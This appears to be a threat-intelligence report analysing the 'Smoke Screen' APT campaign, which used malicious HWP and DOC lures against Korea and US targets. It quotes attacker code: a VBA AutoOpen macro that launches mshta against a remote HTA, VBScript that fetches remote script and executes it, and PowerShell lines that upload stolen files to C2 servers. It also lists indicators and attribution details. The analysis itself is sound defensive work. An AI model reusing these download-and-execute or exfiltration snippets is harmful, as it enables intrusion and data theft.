Analysis of the APT Campaign ‘Smoke Screen’ targeting to
Korea and US

※ Campaign Smoke Screen Flowchart

ESRC found a spear phishing attack occurred on April 11th targeting to those who work in
North Korea-related fields.
The attack, it turns out, was an extension of APT attack of ‘Operation Stealth Power’, which
was spread on April 03, under the theme of [Recent trends of major countries related to the
Korean peninsula] and [3.17 US Pentagon Secret National Security Council] (The word
‘Pentagon’ of the second file is not correctly spelled in Korean), and the same threat actors are
behind the Campaign “Smoke Screen” as those who are responsible for the attack on Korea Hydro
& Nuclear Power in 2014.

[Figure 1] E-mail disguised as government official's remarks about Korea-US Summit

The threat actor attempts to trick users into opening the email titled “Government official's
remarks about Korea-US Summit, with a malicious .hwp attachment named ‘Government
official's remarks about Korea-US Summit.hwp’.

As the distributed malicious hwp document file was encrypted, the EPS vulnerability could not
be exploited without entering the password.

When a document file vulnerability is triggered, it attempts to communicate with a specific
command control (C2) server in Korea and loads the file 'first.hta'. The VBScript code
contained within the HTML application host is then executed.

Set Post0 = CreateObject("MSXML2.ServerXMLHTTP.6.0"):
Post0.open "GET", "http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1", False:

Post0.Send:
t0=Post0.responseText:
Execute(t0)

The malicious script code goes through stages 1-3 of the following steps, runs a PowerShellbased keylogger, and secretly collects information from the infected computer, then registers
itself in the system registry to conduct espionage operations by communicating with its C2
server.

- http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta
- http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1
- http://naban.co[.]kr/mobile/skin/member/ctml/v/upload.php

- http://naban.co[.]kr/mobile/skin/member/ctml/v/Second.hta
- http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=2
- http://naban.co[.]kr/mobile/skin/member/ctml/v/upload.php
- http://naban.co[.]kr/mobile/skin/member/ctml/v/keylogger1.ps1 -> ktmp.log
For reference, the servers used for attack connects to the IP of a specific server in Korea in
common.
- naban.co[.]kr (110.4.107[.]244)
- jmable.mireene[.]com (110.4.107[.]244)
- itoassn.mireene[.]co.kr (110.4.107[.]244)
- jmdesign.mireene[.]com (110.4.107[.]244)

When the malicious HWP document is executed, the title ‘Government official's remarks about
Korea-US Summit.hwp(20190409)’ and the content will be displayed. The document is
registered with the account 'Tom', which is the same as that of 'Stealth Power' operation.

[Figure 1-1] Screen shown after running malicious HWP and the 'Tom' account

A malicious .doc' file named 'TaskForceReport.doc', which was created at 05:15 pm (KST) on April 01, 2019,
has been discovered abroad.

ESRC has observed that the malicious DOC file was related to the recent infringement incidents occurred in
South Korea and the United States, meaning that the threat organization is actively involved in targeted
attacks at home and abroad.

Interestingly, the series of malware used in the APT attack is directly or indirectly related to ‘Kimsuky
organization, Operation Stealth Power Silent Operation’ (2019-04-30) and 'Huge threat coming up,
“Operation Giant Baby”' (2019-03-28), which is one of ‘Baby’ Campaign series.

The malicious HWP document files, which have been found in Korea from the end of March to
the beginning of April, exploited the same vulnerability and the same account name 'Tom'.

[Figure 1-2] Metadata of HWP malicious document file

■ Background of the APT Campaign ‘Smoke Screen’, the master of camouflage and smokescreen
tactics

The malicious file 'TaskForceReport.doc' was first reported abroad, but the document was written in Korean,
and numerous similar variants have been found.

The author of the malicious file used the unusual Windows accounts such as 'windowsmb', 'JamFedura', 'Aji',
'DefaultAcount', 'yer' and 'Roberts Brad' etc., has traded cryptocurrencies such as Bitcoin (BTC), and
participated in the development of gambling games and cryptocurrency-related programs.

Some accounts are registered on the Korean messenger Kakao Talk, and they are using the messenger
services such as Telegram and Skype as well.

ESRC believes that there are 'state-sponsored actors' behind the APT attack based on the analyzed data, and
named the APT attack 'Campaign Smoke Screen', concerning that the attackers are fluent in Korean and
English and act secretly by abusing the stolen profiles that are using photos of foreigners.

■ Analysis of tactics and threat vector of DOC-based APT attack

The malicious document file 'TaskForceReport.doc' (MD5: d400adcd06e0a07549e2465c9c500c45) created on
April 01, 2019 was distributed via the following address.
- tdalpacafarm[.]com/wp-includes/Text/Diff/common/doc.php

However, the above server has already been used by the malicious document 'Oct_Bld_full_view.docm '(MD5:
1a6f9190e7c53cd4e9ca4532547131af) as C2 server, and reported as 'New BabyShark Malware Targets U.S.
National Security Think Tanks' by Unit 42 team of Palo Alto Networks.

The VBA code used at the time is as follows.

Sub change_words(ByVal findWord, ByVal replaceWord)

With Selection.Find
.Text = findWord
.Replacement.Text = replaceWord

.Forward = True
.Wrap = wdFindContinue
.MatchWholeWord = True
End With
Selection.Find.Execute Replace:=wdReplaceAll
End Sub

Sub AutoOpen()
Shell ("mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta")
End Sub

If the 'Vkggy0.hta' in the code above is loaded normally, it will receive an HTTP GET response by executing
the internal VBScript command and the additional PowerShell commands would be subsequently executed.

The recently found malicious document files also have the same sequence flow.

When a malicious document file is executed, a security alert messages, telling that the software update is
required to display the content, pops up to trick users into clicking the Enable Content button.

[Figure 2] Screen displayed after executing the malicious document written in Korean

The malicious document contains files range from 'activeX1.bin' to 'activeX10.bin'. The file 'activeX2.bin' is the
one that has the communication host addresses as follows, and it tries the additional C2 communication by
means of HTA commands and conditions.
- https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/Htqgf0.hta

- https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/cow.php?op=cow.gif

[Figure 3] Code of 'activeX2.bin' file

Another variant with the same name as the 'TaskForceReport.doc' (MD5:
0f77143ce98d0b9f69c802789e3b1713) file has been propagated in March.

- https://christinadudley[.]com/public_html/includes/common/Qfnaq0.hta
- https://christinadudley[.]com/public_html/includes/common/expres.php?op=1
- https://christinadudley[.]com/public_html/includes/common/cow.php?op=Normal.src
- https://christinadudley[.]com/public_html/includes/common/Normal.src
- https://christinadudley[.]com/public_html/includes/common/cow.php?op=exe.gif
- https://christinadudley[.]com/public_html/includes/common/cow.php?op=cow.gif

The C2 domain christinadudley[.]com was used for distribution.

The file 'Qfnaq0.hta' contains the following script code, which loads the code 'expres.php?op=1' with the
decoding key and the routine.

<html><script language="VBScript">On Error Resume Next:Function Co00(c):L=Len(c):s="":For jx=0 To d1:For ix=0 To Int(L/d)-1:s=s&Mid(c,ix*d+jx+1,1):Next:Next:s=s&Right(c,L-Int(L/d)*d):Co00=s:End Function:Set
Post0 = CreateObject("MSXML2.ServerXMLHTTP.6.0"):Post0.open "GET",
"https://christinadudley[.]com/public_html/includes/common/expres.php?op=1",
False:Post0.Send:t0=Post0.responseText:d=7:t0=Co00(t0):Execute(t0):window.close()</script></html>

The finally delivered file 'exe.gif' is encoded in BASE64 code, and converted to 32-bit EXE format malware
after the process of decoding.

[Figure 4] The file encoded in BASE64

The decoded EXE file contains a digital signature of EGIS Co, Ltd, that has been exploited in past infringement
incidents in Korea.

[Figure 5] Digital signature of EGIS Co., Ltd.

HTA script used in the DOC attack vector indicates that the similar script format has been used in both the
recently discovered APT attack 'Campaign Smoke Screen' and the HWP document-based attack 'Operation
Stealth Power', which occurred on March 31 and April 1 in Korea.

The PowerShell-based function ‘Start-KeyLogger’ installed by the HWP malicious document was also used
the same as it is used in the DOC malicious document series.

The threat organization exploited the HWP document vulnerability for conducting the APT attack against
Korea while they used malicious DOC documents for carrying out the attacks targeting to foreign countries.

[Figure 6] Comparison of malicious scripts found home and abroad

In particular, the above figure shows that the function styles used by PowerShell as well as the file names
('expres.php?op=1', 'cow.php?op=1") and parameters used to communicate with the C2 server are very
similar in both scripts.

In addition, the file name 'upload.php' is used in common for information leakage. The C2 server exploiting
the HWP vulnerability is in Korea, and the C2 server exploiting DOC vulnerability contains the subaddress 'kr'
in the middle of the address.

● HWP
retu=wShell.run("cmd.exe /c powershell.exe (New-Object System.Net.WebClient).UploadFile
('http://jmable.mireene[.]com/shop/price/com/upload.php','"&amp;ttmp0&amp;"');del
"""&amp;ttmp0&amp;""";del """&amp;ttmp&amp;"""",0,true)

● DOC
retu=wShell.run(“powershell.exe (New-Object System.Net.WebClient).UploadFile
(‘https://tdalpacafarm[.]com/files/kr/contents/upload.php’,'”&ttmp1&”‘);del
“””&ttmp1&”””;del “””&ttmp&””””,0,true)

Also, both files have exactly the same registry key 'VBAWarnings' and the log file name 'ttmp.log'.

Many of the traces mentioned above and the similar pattern of server-side attacks are suggesting that both
HWP malicious documents found in Korea and the DOC malicious documents reported in foreign countries
were used as the attack method by the same APT group.

[Figure 7] Creating the registry key 'VBAWarnings' and the file 'ttmp.log'

Malicious DOC document file are characterized by Korean language settings by default.

■ Comparison of Similar Threat Cases and Indicators of Compromise

A number of threat cases exploiting hta files have been identified recently, especially a large proportion of the
use of C2 server '(seoulhobi[.]biz / 192.186.142[.]74)’.

The malware 'AltcoinMiningBot.exe' (MD5: cf264f9bca2f2fbcc2c1e7a4a491afec) disguised as Altcoin mining
bot program has been distributed and communicates with the host '192.186.142[.]74'.

- 'explorer.tmp' (MD5 : 599ef2988141d251c3f4ce991a9b5cd2)

The malicious file 'explorer.tmp' uses 'cowboy' characters and the name 'cowboy' is also used for the
command 'cow.php?op=cow.gif'.

The malicious document file 'white_paper.doc' has been registered by two accounts 'Aji' and 'JamFedura', but
the same C2 server was used as the domain seoulhobi[.]biz (192.186.142[.]74) for those accounts.

In addition, the cryptocurrency-related decoy file such as 'xCryptoCrash_Schedule.doc' was deployed for
performing the attack.

■ Investigation of the threat actors based on Human-Led Threat Intelligence

ESRC has confirmed that the attacker used MonoVM web hosting with the email account
'snow8949@hotmail.com' during the process of investigating the person who registered the domain
seoulhobi[.]biz (192.186.142[.]74).

As reference information, there have been some reports on the use of the "snow + number" email ID in an
infringement incident occurred in Korea in 2018.

The phishing domain disguised as a Korea's largest web portal has been used for those attacks, with Japan
selected in registration information, and names such as "Jane Jhone" were used as well.
- http://nidhelpnaver[.]com

The analysis as described above is revealing the correlation of the threat actors as follows.

First of all, the account 'JamFedura' was identified in the attack in February.

The similar accounts have been registered to several social media platforms such as Twitter, Telegram and
Cryptolancer with different profile images.

Twitter account '@JFedura' is set to the United States in the location setting and enrolled in December 2017,
there is some English typo in the introduction column, [Cryptocurrency Developer] is mentioned.

'jamfedura' that is the account of Cryptolancer, which connects a cryptocurrency developer as a freelancer to
the employers, was enrolled in February 2019, introduces itself as [Cryptocurrency Developer] and is set to
China in location settings.

[Figure 10] Fake accounts similar to Twitter, Telegram and Cryptolancer

The postings on Twitter contains only a retweet of the cryptocurrency transactions or a short tweet in English
created by several accounts.

The hackers were also carrying out the operations with the same ID and profile image as Twitter accounts on
the online outsourcing platform Wishket, which connects Korean program development companies and
freelancer developers.

In addition, they joined the international Bitcoin Forum August 2017, and has been active by January 2018.

[Figure 11] Portfolio registered in Bitcoin Forum and Wishket
Self-introduction posted on Wishket describes the personal history of the hacker including the 8 years of
development experience and active participation in the cryptocurrency development, along with portfolios of
‘the development of game sites’, the development of crypto-mining programs’ and ‘the cryptocurrency
trading sites’ uploaded.

Bitcoin Forum displays his malicious activities such as the email address 'JamShine1993@hotmail.com', which
is linked to 'om*****@hotmail.com’.

The bitcoin wallet address (15vsH2T3ss9owzuaGnN7ee155tEwS4igFg) is also seen in Bitcoin Forum, but no
specific transaction details have been observed.

[Figure 12] Account linked to the hotmail address registered in Bitcoin Forum

The variant, which is related to the analysis data of 'NavRAT Uses US-North Korea Summit As Decoy For
Attacks In South Korea' released by Cisco Talos team in May 2018 is strongly linked to the “Smoke Screen”
campaign.

Talos team has previously suspected that there was possibility of the correlation between 'NavRAT' family and
'Group123' (aka Geumseong121, RedEyes), and ESRC confirmed that the series is exactly the same as the
HWP vulnerability shellcode used for the attack on Korea Hydro & Nuclear Power in 2014.

ESRC is conducting a thorough investigation on “Smoke Screen” campaign, regarding that specific IP bands
and typical disturbance tactics used for the campaign show similar patterns to the multiple strategies and
techniques deployed in recent cyber operations.

According to the self-analysis data and classification criteria, it is most likely that the KHNP-related hacking
group is behind the “Smoke Screen” APT campaign, rather than Geumseong121.

However, since the same IOC has been identified in the attacks carried out by the two organizations in
several cases, there was a possibility of mutual cooperation, reorganization, and shift of the personnel system.

ESRC found that the malicious file variant named 'NavRAT' attempted to communicate with an email account
'jamshine1993@hotmail.com' in the process of investigating the threat actors behind the “Smoke Screen”
APT campaign.

The ID 'tiger199392' disguised as a Google update program was used for the communication and sent
information of the infected users to the email address 'Jamshine1993@hotmail.com'.

[Figure 13] NavRAT communicating with 'JamShine1993@hotmail.com'

The "NavRAT" type of malicious file contains some similar accounts (hni) to the HWP vulnerability code (MD5:
c94e5da189bf166fc4a2670685a796a3) of the so-called "Kimsuky" series reported in 2016.

[Figure 14] Comparison of NavRAT (upper) series and Kimsuky series HWP (lower) code

A similar account is also found on Telegram, where the representative profile image is
displayed by stealing the image of "Reece Thompson," starring actor of 2007 movie ‘Rocket
Science’.

[Figure 15] Stealing the image of the starring actor of 2007 movie ‘Rocket Science’ for
Telegram profile

It is not clear whether the movie was stolen on purpose or randomly selected by the attacker,
and it is known that a Korean judge appears in the movie.

Twitter's profile image was also created by an unauthorized use of one of the images posted
on a hair model site.

[Figure 16] Model images on “hothairstyle” site

ESRC found that the account 'jamfedura0293' on Telegram was registered on January 4, 2019
in the Korean version of Philippine bitcoin trading site 'Bit Manila'. The attacker has been
active on the site as 'Koinjjang1985'.

For reference, as 'Bit Manila' is operated in common with 'Philgo' site, users can use the same
ID on both sites.

[Figure 17] The hacker’s activities in the Philippine bitcoin trading site

'코인짱 1985' account is secretly trading with sellers and buyers by creating the comments
inducing the site users to contact him via Telegram.

In particular, he posted a comment on the post “Sales of 1500 bitcoin”, which was uploaded
on December 23 last year, at 23:58 on January 04, 2019.

1500 bitcoin is a substantial amount even considering the market price at the time.

[Figure 18] Trading activities on Filipino bitcoin trading site

ESRC have discovered the multiple accounts using the same profile image which is the same
as that used for Telegram. Interestingly, 'tiger1993' account, which was used by the malware,
has been registered on KakaoTalk with the name 'coinchange'.
Furthermore, the profile image of the account exactly matched the image of the Telegram
account '@jamfedura0293'.

[Figure 19] 'tiger1993' registered in KakaoTalk

It is practically impossible for a two different person to accidentally use the same profile image
on KakaoTalk and Telegram at the same time.

The same profile image was also found on 'freelancer' site, which connects the program
developers and the employers.

[Figure 20] 'aji9170' registered on 'freelancer' site using the same image

The account 'aji9170' registered on the freelance site is set as Korea in the nationality, and
displays the cryptocurrency developer information in the same way as the existing case.

The user registered with the account 'aji9170' posted the several texts in English and Korean,
appealing that he has been actively participated in the multiple projects, and his nationality is
set on Korea.
